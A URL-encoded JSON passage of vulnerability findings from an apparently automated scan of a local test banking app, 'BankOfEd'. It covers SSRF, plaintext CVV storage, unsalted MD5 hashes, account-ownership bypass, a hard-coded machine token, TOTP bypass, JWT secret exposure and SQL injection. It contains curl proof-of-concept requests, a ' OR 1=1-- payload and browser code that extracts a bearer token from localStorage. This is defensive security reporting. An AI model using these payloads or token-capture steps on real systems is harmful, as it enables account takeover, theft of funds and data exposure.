0size%20of%20559%20bytes%2C%20and%20an%20%60avatar_data%60%20value%20containing%20base64-encoded%20HTML%20that%20begins%20with%20the%20Example%20Domain%20page%20and%20includes%20%60%3Ctitle%3EExample%20Domain%3C%2Ftitle%3E%60.%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fprofile%2Favatar%20HTTP%2F1.1%5CnContent-Type%3A%20application%2Fjson%5CnAuthorization%3A%20Bearer%20%5BREDACTED_BEARER%5D%20session%5D%5Cn%5Cn%7B%5C%22url%5C%22%3A%5C%22https%3A%2F%2Fexample.com%5C%22%7D%22%2C%22response_evidence%22%3A%22HTTP%2F1.1%20200%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22avatar_data%5C%22%3A%5C%22data%3Atext%5C%5C%2Fhtml%3Bbase64%2CPCFkb2N0eXBlIGh0bWw%2BPGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5FeGFtcGxlIERvbWFpbjwvdGl0bGU%2B...%5C%22%2C%5C%22size%5C%22%3A559%2C%5C%22source_url%5C%22%3A%5C%22https%3A%5C%5C%2F%5C%5C%2Fexample.com%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22specialist_agent%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Using%20the%20supplied%20admin%20session%2C%20I%20compared%20an%20ordinary%20external%20URL%20with%20a%20loopback%20URL.%20POSTing%20http%3A%2F%2F127.0.0.1%3A8081%2F%20returned%20HTTP%20200%20and%20disclosed%20the%20local%20application's%20HTML%20as%20a%20base64%20data%20URL%2C%20including%20the%20distinctive%20local%20page%20title%2C%20so%20the%20endpoint%20neither%20blocks%20loopback%20destinations%20nor%20enforces%20an%20image%20response%20type.%20This%20directly%20disproves%20the%20plausible%20innocent%20explanations%20of%20URL%20echoing%2C%20external-only%20fetching%2C%20or%20safe%20avatar-only%20validation.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22url%5C%22%3A%5C%22http%3A%2F%2F127.0.0.1%3A8081%2F%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fprofile%2Favatar%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%20and%20copy%20the%20bearer%20token%20from%20the%20Authorization%20request%20header%20or%20browser%20storage.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Credit-card%20CVV%20stored%20and%20returned%20in%20plaintext%22%2C%22description%22%3A%22The%20credit-card%20account%20creation%20endpoint%20stores%20the%20card%20CVV%20and%20returns%20it%20in%20plaintext%20together%20with%20the%20full%20card%20number%20and%20expiry%20date.%22%2C%22impact%22%3A%22Access%20to%20account%20responses%20or%20stored%20card%20records%20could%20expose%20complete%20payment-card%20verification%20data%20and%20increase%20the%20risk%20of%20card%20fraud.%22%2C%22likelihood%22%3A%22An%20authenticated%20user%20can%20trigger%20the%20exposure%20by%20creating%20a%20credit-card%20account.%20The%20application%20automatically%20returns%20the%20card%20details%20in%20the%20creation%20response%20and%20retains%20the%20CVV%20for%20later%20account%20responses.%22%2C%22recommendation%22%3A%22Do%20not%20store%20CVVs%20after%20authorization.%20Use%20a%20PCI-compliant%20payment%20provider%20and%20tokenization.%20Mask%20card%20numbers%20in%20API%20responses%2C%20omit%20CVVs%20from%20all%20responses%2C%20and%20prevent%20sensitive%20card%20data%20from%20being%20written%20to%20logs.%22%2C%22cvss_score%22%3A7.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%22%2C%22evidence%22%3A%22An%20authenticated%20POST%20to%20%2Fapi%2Faccounts%20with%20%7B%5C%22account_type%5C%22%3A%5C%22credit_card%5C%22%2C%5C%22account_name%5C%22%3A%5C%22AESPA%20Test%20Card%5C%22%7D%20created%20credit-card%20account%20ID%20102.%20The%20HTTP%20201%20response%20returned%20the%20full%20card%20number%204532884657695298%2C%20expiry%2009%2F29%2C%20and%20CVV%20960%20in%20plaintext.%22%2C%22request_evidence%22%3A%22Authenticated%20POST%20%2Fapi%2Faccounts%20body%20%7B%5C%22account_type%5C%22%3A%5C%22credit_card%5C%22%2C%5C%22account_name%5C%22%3A%5C%22AESPA%20Test%20Card%5C%22%7D%20using%20the%20disposable%20weak_test%20account.%22%2C%22response_evidence%22%3A%22HTTP%20201%20included%20%5C%22card_number%5C%22%3A%5C%224532884657695298%5C%22%2C%5C%22card_expiry%5C%22%3A%5C%2209%2F29%5C%22%2C%5C%22card_cvv%5C%22%3A%5C%22960%5C%22.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22I%20tested%20the%20main%20innocent%20explanation%20that%20the%20CVV%20appeared%20only%20in%20the%20creation%20response%20and%20was%20not%20retained.%20An%20authenticated%20GET%20of%20the%20account%20collection%20returned%20a%20credit-card%20CVV%2C%20and%20a%20direct%20GET%20of%20account%2051%20independently%20returned%20the%20full%20card%20number%2C%20expiry%2C%20and%20plaintext%20%60card_cvv%60%20value%20from%20the%20stored%20record.%20This%20confirms%20persistent%20storage%20and%20disclosure%20rather%20than%20a%20one-time%20response%20artifact.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Faccounts%2F51%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%2C%20then%20copy%20the%20Bearer%20token%20from%20the%20Authorization%20request%20header%20in%20the%20browser%20Network%20panel%20and%20use%20it%20for%20this%20request.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Customer%20passwords%20stored%20as%20unsalted%20MD5%20hashes%22%2C%22description%22%3A%22The%20registration%20endpoint%20stores%20customer%20passwords%20as%20deterministic%2C%20unsalted%20MD5%20hashes.%20Authentication%20responses%20also%20expose%20the%20stored%20password_hash%20value.%22%2C%22impact%22%3A%22An%20attacker%20who%20obtains%20the%20hashes%20could%20cheaply%20recover%20common%20passwords%20and%20identify%20accounts%20that%20share%20a%20password.%20A%20separately%20identified%20unauthenticated%20export%20exposes%20existing%20customer%20hashes%2C%20making%20offline%20cracking%20directly%20possible.%22%2C%22likelihood%22%3A%22The%20issue%20was%20reproduced%20with%20two%20accounts%20using%20the%20same%20controlled%20password.%20Both%20accounts%20produced%20the%20same%20known%20MD5%20digest%2C%20and%20the%20digest%20was%20returned%20by%20the%20API.%22%2C%22recommendation%22%3A%22Replace%20MD5%20with%20Argon2id%20or%20bcrypt%20using%20password_hash%20and%20password_verify%2C%20a%20suitable%20work%20factor%2C%20and%20unique%20salts.%20Rehash%20legacy%20MD5%20passwords%20after%20successful%20login%2C%20remove%20password_hash%20from%20every%20API%20response%2C%20and%20require%20password%20resets%20for%20exposed%20accounts.%22%2C%22cvss_score%22%3A7.5%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Fregister%22%2C%22evidence%22%3A%22Two%20disposable%20accounts%2C%20aespa.weak.20260908%40example.com%20(ID%2017)%20and%20aespa.weak2.20260908%40example.com%20(ID%2018)%2C%20were%20created%20with%20the%20controlled%20password%20%5C%22a%5C%22.%20Both%20accounts%20returned%20password_hash%20%5C%220cc175b9c0f1b6a831c399e269772661%5C%22%2C%20the%20known%20MD5%20digest%20of%20%5C%22a%5C%22.%22%2C%22request_evidence%22%3A%22Two%20POST%20%2Fapi%2Fauth%2Fregister%20requests%20used%20unique%20emails%20and%20the%20controlled%20password%20%5C%22a%5C%22.%22%2C%22response_evidence%22%3A%22Account%20id%2017%20login%20returned%20password_hash%200cc175b9c0f1b6a831c399e269772661.%20Account%20id%2018%20registration%20returned%20the%20identical%20password_hash.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Both%20independently%20registered%20disposable%20accounts%20authenticated%20with%20the%20supplied%20password%20%5C%22a%5C%22%20and%20returned%20the%20identical%20value%200cc175b9c0f1b6a831c399e269772661%20in%20password_hash.%20That%20value%20is%20MD5(%5C%22a%5C%22)%2C%20so%20the%20live%20behavior%20rules%20out%20per-user%20salting%2C%20and%20the%20login%20response%20directly%20exposes%20the%20digest.%20The%20static%20path%20is%20consistent%20with%20the%20runtime%20results%2C%20and%20no%20benign%20representation%20or%20fixture-only%20explanation%20remains.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22email%5C%22%3A%5C%22aespa.weak.20260908%40example.com%5C%22%2C%5C%22password%5C%22%3A%5C%22a%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fauth%2Flogin%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A00%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22External%20transfer%20can%20debit%20another%20user's%20account%22%2C%22description%22%3A%22An%20authenticated%20caller%20controls%20from_account_id%20in%20POST%20%2Fapi%2Ftransfers%2Fexternal.%20transferExternal()%20loads%20it%20with%20Account%3A%3AfindById()%20rather%20than%20Account%3A%3AfindByIdAndUser()%2C%20then%20debits%20that%20account%20and%20records%20the%20transfer.%20A%20caller%20who%20supplies%20another%20customer's%20account%20ID%20can%20transfer%20funds%20from%20that%20account%20to%20an%20attacker-selected%20BSB%20and%20account%20number.%22%2C%22impact%22%3A%22%22%2C%22likelihood%22%3A%22%22%2C%22recommendation%22%3A%22Confirmed%20the%20service-layer%20ownership%20bypass.%20Linked%20to%20the%20existing%20endpoint%20finding.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22%22%2C%22affected_url%22%3A%22BankOfEd-main%2Fsrc%2FServices%2FTransferService.php%3A174%22%2C%22evidence%22%3A%22Router.php%20maps%20authenticated%20POST%20%2Fapi%2Ftransfers%2Fexternal%20to%20TransactionController%3A%3AtransferExternal.%20TransactionController.php%20reads%20from_account_id%2C%20destination%20details%2C%20and%20amount%20from%20php%3A%2F%2Finput%20and%20passes%20them%20to%20TransferService.%20TransferService.php%3A170-176%20derives%20the%20authenticated%20user%20ID%20but%20calls%20Account%3A%3AfindById(%24fromAccountId)%20without%20user_id.%20Lines%20267-270%20call%20Account%3A%3AupdateBalance(%24fromAccountId%2C%20'-'%20.%20%24debitAmount)%20and%20optionally%20credit%20the%20chosen%20internal%20destination.%20Account.php%20provides%20findByIdAndUser()%20but%20it%20is%20not%20used%20here.%22%2C%22request_evidence%22%3A%22%22%2C%22response_evidence%22%3A%22%22%2C%22finding_source%22%3A%22sast_lead%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Confirmed%20the%20service-layer%20ownership%20bypass.%20Linked%20to%20the%20existing%20endpoint%20finding.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A00%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22External%20transfer%20debits%20an%20account%20without%20checking%20ownership%22%2C%22description%22%3A%22POST%20%2Fapi%2Ftransfers%2Fexternal%20accepts%20from_account_id%20from%20the%20authenticated%20request.%20TransactionController%20validates%20only%20that%20it%20is%20numeric%20and%20passes%20it%20to%20TransferService%3A%3AtransferExternal.%20That%20service%20loads%20the%20source%20with%20Account%3A%3AfindById%20rather%20than%20findByIdAndUser%2C%20performs%20no%20ownership%20check%2C%20and%20passes%20the%20attacker-selected%20ID%20to%20Account%3A%3AupdateBalance%2C%20whose%20UPDATE%20debits%20that%20account.%20Any%20authenticated%20user%20who%20knows%20or%20guesses%20another%20account%20ID%20can%20transfer%20funds%20from%20it%20to%20an%20attacker-controlled%20destination.%22%2C%22impact%22%3A%22%22%2C%22likelihood%22%3A%22%22%2C%22recommendation%22%3A%22Confirmed%20unauthorized%20debit%20and%20balance%20change.%20Linked%20to%20the%20existing%20transfer%20ownership%20finding.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22%22%2C%22affected_url%22%3A%22BankOfEd-main%2Fsrc%2FModels%2FAccount.php%3A95%22%2C%22evidence%22%3A%22src%2FControllers%2FTransactionController.php%3A83-112%20reads%20JSON%20from%20php%3A%2F%2Finput%20and%20passes%20(int)%24data%5B'from_account_id'%5D%3B%20src%2FServices%2FTransferService.php%3A175-180%20calls%20Account%3A%3AfindById(%24fromAccountId)%20without%20binding%20it%20to%20%24userId%3B%20src%2FServices%2FTransferService.php%3A266-272%20calls%20Account%3A%3AupdateBalance(%24fromAccountId%2C%20'-'%20.%20%24debitAmount)%3B%20src%2FModels%2FAccount.php%3A93-95%20executes%20UPDATE%20accounts%20SET%20balance%20%3D%20balance%20%2B%20%3F%20WHERE%20id%20%3D%20%3F.%22%2C%22request_evidence%22%3A%22%22%2C%22response_evidence%22%3A%22%22%2C%22finding_source%22%3A%22sast_lead%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Confirmed%20unauthorized%20debit%20and%20balance%20change.%20Linked%20to%20the%20existing%20transfer%20ownership%20finding.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Hard-coded%20fallback%20machine%20token%20authorizes%20payment%20transfers%22%2C%22description%22%3A%22The%20Authorization%20bearer%20token%20from%20an%20unauthenticated%20client%20reaches%20MachineToken%3A%3AvalidateToken.%20When%20no%20matching%20active%20database%20token%20is%20found%2C%20the%20method%20compares%20the%20raw%20token%20against%20a%20configured%20value%20that%20defaults%20to%20a%20hard-coded%20repository%20secret.%20Supplying%20that%20known%20default%20returns%20the%20privileged%20configured_machine_token%20identity.%20Router%20then%20permits%20POST%20%2Fapi%2Fpayments%2Ftransfer%2C%20and%20PaymentController%20authorizes%20that%20identity%20to%20debit%20the%20FACE%20Insurance%20merchant%20account%20or%20any%20account%20owned%20by%20user%2016.%20This%20can%20enable%20unauthorized%20transfers%20when%20MACHINE_TOKEN%20is%20unset.%22%2C%22impact%22%3A%22%22%2C%22likelihood%22%3A%22%22%2C%22recommendation%22%3A%22Confirmed%20the%20runtime%20deployment%20accepts%20the%20hardcoded%20credential%20and%20permits%20a%20completed%20payment%20transfer.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22%22%2C%22affected_url%22%3A%22BankOfEd-main%2Fsrc%2FModels%2FMachineToken.php%3A23%22%2C%22evidence%22%3A%22MachineAuthMiddleware.php%3A13-24%20reads%20HTTP_AUTHORIZATION%20and%20passes%20its%20bearer%20value%20to%20MachineToken%3A%3AvalidateToken.%20MachineToken.php%3A10%20hashes%20the%20input%20for%20DB%20lookup%2C%20but%20lines%2023-31%20load%20config%20and%20accept%20rawToken%20%3D%3D%3D%20fallbackToken%2C%20returning%20configured_machine_token.%20config%2Fapp.php%3A35%20defaults%20MACHINE_TOKEN%20to%20mch_face_insurance_secret_key_2026.%20Router.php%20exposes%20POST%20%2Fapi%2Fpayments%2Ftransfer%20with%20machine%20auth.%20PaymentController.php%3A183-193%20authorizes%20configured_machine_token%20for%20the%20FACE%20Insurance%20account%20or%20user%2016%2C%20and%20lines%20227-249%20debit%20the%20source%20and%20create%20the%20transfer.%22%2C%22request_evidence%22%3A%22%22%2C%22response_evidence%22%3A%22%22%2C%22finding_source%22%3A%22sast_lead%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Confirmed%20the%20runtime%20deployment%20accepts%20the%20hardcoded%20credential%20and%20permits%20a%20completed%20payment%20transfer.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A07%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Manual%20transfers%20bypass%20required%20TOTP%20verification%22%2C%22description%22%3A%22The%20transfer%20preflight%20endpoint%20identifies%20manual%20transfers%20as%20requiring%20TOTP%2C%20but%20the%20final%20transfer%20endpoint%20completes%20the%20transaction%20when%20the%20totp_code%20field%20is%20omitted.%22%2C%22impact%22%3A%22An%20attacker%20with%20a%20stolen%20authenticated%20session%20could%20perform%20manual%20transfers%20without%20passing%20the%20intended%20second-factor%20check.%20The%20observed%20flow%20also%20allowed%20a%20user%20without%20configured%20TOTP%20to%20complete%20a%20transfer%20that%20explicitly%20required%20it.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20an%20authenticated%20session%20but%20only%20involves%20sending%20a%20direct%20request%20to%20the%20transfer%20endpoint%20without%20the%20optional%20totp_code%20field.%20The%20bypass%20was%20reproduced%20successfully.%22%2C%22recommendation%22%3A%22When%20a%20transfer%20requires%20TOTP%2C%20reject%20the%20final%20transfer%20unless%20the%20user%20has%20TOTP%20configured%20and%20supplies%20a%20valid%20code.%20Enforce%20this%20check%20server-side%20in%20the%20final%20transfer%20operation%20rather%20than%20relying%20on%20preflight%20or%20UI%20validation.%20If%20the%20two-step%20workflow%20must%20be%20retained%2C%20issue%20an%20atomic%2C%20short-lived%20preflight%20authorization%20token%20and%20validate%20it%20when%20executing%20the%20transfer.%22%2C%22cvss_score%22%3A8.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AN%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%22%2C%22evidence%22%3A%22POST%20%2Fapi%2Ftransfers%2Fcheck%20for%20account%201%2C%20a%20manual%20transfer%20to%20account%2030000001%2C%20and%20an%20amount%20of%200.01%20returned%20HTTP%20200%20with%20requires_totp%20set%20to%20true%2C%20reason%20set%20to%20manual_entry%2C%20and%20totp_configured%20set%20to%20false.%20POST%20%2Fapi%2Ftransfers%2Fexternal%20with%20the%20same%20transfer%20details%20and%20no%20totp_code%20returned%20HTTP%20201%20with%20transaction_id%2036%2C%20status%20completed%2C%20totp_verified%20set%20to%20false%2C%20and%20a%20new%20source%20balance%20of%203450.74.%22%2C%22request_evidence%22%3A%22Preflight%3A%20POST%20%2Fapi%2Ftransfers%2Fcheck%20body%20%7B%5C%22from_account_id%5C%22%3A1%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22to_bsb%5C%22%3A%5C%22062-001%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2230000001%5C%22%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%7D.%20Transfer%3A%20POST%20%2Fapi%2Ftransfers%2Fexternal%20with%20the%20same%20accounts%20and%20amount%2C%20no%20totp_code.%22%2C%22response_evidence%22%3A%22Preflight%20HTTP%20200%3A%20%7B%5C%22requires_totp%5C%22%3Atrue%2C%5C%22reason%5C%22%3A%5C%22manual_entry%5C%22%2C%5C%22totp_configured%5C%22%3Afalse%7D.%20Transfer%20HTTP%20201%3A%20%7B%5C%22transaction_id%5C%22%3A36%2C%5C%22from_account_id%5C%22%3A1%2C%5C%22amount%5C%22%3A%5C%220.01%5C%22%2C%5C%22transfer_type%5C%22%3A%5C%22manual%5C%22%2C%5C%22totp_verified%5C%22%3Afalse%2C%5C%22status%5C%22%3A%5C%22completed%5C%22%2C%5C%22new_from_balance%5C%22%3A%5C%223450.74%5C%22%7D.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22The%20non-mutating%20preflight%20for%20the%20same%20manual-transfer%20path%20returned%20requires_totp%3Dtrue%20with%20reason%3Dmanual_entry.%20I%20then%20supplied%20the%20explicit%20invalid%20code%20000000%20to%20the%20final%20endpoint%2C%20and%20it%20still%20created%20transaction%2037%20with%20HTTP%20201%2C%20status%20completed%2C%20and%20totp_verified%3Dfalse.%20This%20rules%20out%20a%20client-only%20omission%20or%20request-shape%20issue%3B%20the%20server%20accepts%20a%20transfer%20even%20when%20the%20provided%20TOTP%20is%20plainly%20unverified.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22curl%20-s%20-S%20-i%20-k%20-L%20--max-time%2020%20-X%20POST%20-H%20'Content-Type%3A%20application%2Fjson'%20-H%20'Content-Type%3A%20application%2Fjson'%20--data-raw%20'%7B%5C%22from_account_id%5C%22%3A1%2C%5C%22to_bsb%5C%22%3A%5C%22000-000%5C%22%2C%5C%22to_account_number%5C%22%3A%5C%2230000001%5C%22%2C%5C%22amount%5C%22%3A0.01%2C%5C%22description%5C%22%3A%5C%22validation%20probe%5C%22%2C%5C%22totp_code%5C%22%3A%5C%22000000%5C%22%7D'%20http%3A%2F%2Flocalhost%3A8081%2Fapi%2Ftransfers%2Fexternal%20-H%20%5C%22Authorization%3A%20Bearer%20%24(cat%20aespa-poc-auth.txt)%5C%22%22%2C%22poc_setup%22%3A%22This%20finding%20requires%20an%20authenticated%20session%20(log%20in%20as%20**admin**%20or%20an%20equivalent%20user).%5Cn%5CnLog%20in%20as%20the%20admin%20user%20and%20copy%20its%20bearer%20token%20from%20the%20Authorization%20request%20header.%20Replay%20the%20PoC%20with%20that%20token.%5Cn%5CnCapture%20the%20credential%20into%20a%20file%20named%20%60aespa-poc-auth.txt%60%20in%20the%20directory%20you%20run%20the%20command%20from%3A%5Cn%5CnIn%20the%20browser%20DevTools%20Console%20(adjust%20the%20storage%20key%20for%20the%20app)%3A%5Cn%60%60%60js%5Cnconst%20token%20%3D%20localStorage.getItem('token')%3B%20%2F%2F%20or%20sessionStorage%5Cnconst%20a%20%3D%20document.createElement('a')%3B%5Cna.href%20%3D%20URL.createObjectURL(new%20Blob(%5Btoken%5D%2C%20%7Btype%3A'text%2Fplain'%7D))%3B%5Cna.download%20%3D%20'aespa-poc-auth.txt'%3B%20a.click()%3B%5Cn%60%60%60%5Cn%5CnThen%20move%20%60aespa-poc-auth.txt%60%20next%20to%20where%20you%20run%20the%20command%20below.%22%7D%2C%7B%22owasp_category%22%3A%22A02%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22Public%20health%20endpoint%20exposes%20the%20customer%20JWT%20signing%20secret%22%2C%22description%22%3A%22GET%20%2Fapi%2Fhealth%20returns%20the%20configured%20jwt_secret%20without%20authentication.%20Any%20remote%20caller%20can%20retrieve%20the%20HS256%20credential%20intended%20to%20authenticate%20customer%20tokens.%20The%20customer%20AuthMiddleware%20then%20trusts%20token%20claims%20to%20select%20a%20user%20record%20and%20authorize%20all%20customer%20routes.%20In%20the%20current%20implementation%20AuthService%3A%3AdecodeToken%20does%20not%20verify%20the%20signature%20at%20all%2C%20so%20arbitrary%20customer%20impersonation%20is%20possible%20even%20without%20using%20the%20disclosed%20secret.%22%2C%22impact%22%3A%22%22%2C%22likelihood%22%3A%22%22%2C%22recommendation%22%3A%22Confirmed%20the%20public%20signing-secret%20disclosure.%20Linked%20to%20the%20existing%20health%20endpoint%20finding.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22%22%2C%22affected_url%22%3A%22BankOfEd-main%2Fsrc%2FRouter.php%3A32%22%2C%22evidence%22%3A%22config%2Fapp.php%3A23%20supplies%20jwt_secret.%20src%2FRouter.php%3A21-35%20loads%20the%20config%20and%20includes%20jwt_secret%20in%20Response%3A%3Asuccess%3B%20src%2FRouter.php%3A80%20exposes%20GET%20%2Fapi%2Fhealth%20with%20auth%3Dfalse.%20src%2FMiddleware%2FAuthMiddleware.php%3A24-45%20accepts%20the%20decoded%20sub%20and%20loads%20that%20user.%20src%2FServices%2FAuthService.php%3A51-66%20explicitly%20parses%20the%20JWT%20payload%20without%20signature%20verification%20and%20checks%20only%20exp.%20Seed%20data%20creates%20predictable%20user%20IDs%2C%20including%20user%201.%22%2C%22request_evidence%22%3A%22%22%2C%22response_evidence%22%3A%22%22%2C%22finding_source%22%3A%22sast_lead%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Confirmed%20the%20public%20signing-secret%20disclosure.%20Linked%20to%20the%20existing%20health%20endpoint%20finding.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A03%22%2C%22severity%22%3A%22high%22%2C%22title%22%3A%22SQL%20Injection%20in%20Admin%20Customer%20Search%22%2C%22description%22%3A%22The%20search%20parameter%20of%20the%20admin%20customer%20listing%20endpoint%20is%20interpolated%20into%20the%20listing%20and%20count%20SQL%20queries.%20An%20injected%20boolean%20expression%20changes%20the%20query%20predicate%20and%20bypasses%20the%20intended%20customer%20filter.%22%2C%22impact%22%3A%22An%20authenticated%20administrator%2C%20or%20an%20attacker%20controlling%20an%20administrator%20session%2C%20could%20alter%20database%20queries%20and%20potentially%20read%20or%20modify%20data%20accessible%20to%20the%20application's%20database%20account.%22%2C%22likelihood%22%3A%22Exploitation%20requires%20an%20authorized%20administrator%20session.%20The%20observed%20boolean%20payload%20was%20short%20and%20reliable%2C%20and%20it%20changed%20both%20the%20returned%20customer%20records%20and%20pagination%20count.%22%2C%22recommendation%22%3A%22Use%20prepared%20statements%20with%20bound%20parameters%20for%20every%20search%20value%20in%20both%20the%20listing%20and%20count%20queries.%20Escape%20LIKE%20wildcard%20characters%20separately%20when%20literal%20matching%20is%20intended.%20Use%20a%20least-privilege%20database%20account%20and%20add%20regression%20tests%20covering%20SQL%20metacharacters%20in%20search%20input.%22%2C%22cvss_score%22%3A8.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fapi%2Fadmin%2Fcustomers%3Fsearch%3D%2527%2520OR%25201%253D1--%2520%26page%3D1%26per_page%3D15%22%2C%22evidence%22%3A%22A%20baseline%20search%20for%20aespa-no-such-customer%20returned%20HTTP%20200%20with%20no%20customers%20and%20total%3D0.%20Using%20search%3D'%20OR%201%3D1--%20returned%20HTTP%20200%20with%20customer%20records%20for%20IDs%201%20through%2016%20and%20pagination%20total%3D16%2C%20showing%20that%20the%20injected%20boolean%20expression%20changed%20the%20database%20query%20predicate.%22%2C%22request_evidence%22%3A%22GET%20%2Fapi%2Fadmin%2Fcustomers%3Fsearch%3D%2527%2520OR%25201%253D1--%2520%26page%3D1%26per_page%3D15%20using%20the%20authorized%20admin_test%20session.%22%2C%22response_evidence%22%3A%22HTTP%20200%20with%20customer%20rows%20for%20IDs%201%20through%2016%20and%20%5C%22pagination%5C%